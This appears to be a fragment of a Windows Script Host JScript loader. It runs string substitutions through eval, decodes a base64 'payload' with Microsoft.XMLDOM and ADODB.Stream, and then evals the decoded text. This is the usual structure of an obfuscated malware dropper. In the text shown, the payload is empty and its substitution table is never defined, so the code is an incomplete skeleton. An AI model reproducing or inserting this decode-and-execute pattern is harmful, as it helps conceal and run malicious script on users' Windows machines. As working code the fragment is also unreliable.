String.prototype.unpack = function(){return "";};
var payload = "".unpack();
for(var i=0;i<table.length;i++){
 eval("payload = payload.replace(new RegExp(table[i][0], 'g'), table[i][1]);");
}
var doc = WSH.CreateObject("microsoft.xmldom");
var el = doc.createElement("bin");
el.dataType = "bin.base64";
el.text = payload;
var stream = WSH.CreateObject("adodb.stream");
stream.Type = 1;
stream.Open();
stream.Write(el.nodeTypedValue);
stream.Position = 0;
stream.Type = 2;
var decoded = stream.ReadText();
eval(decoded);
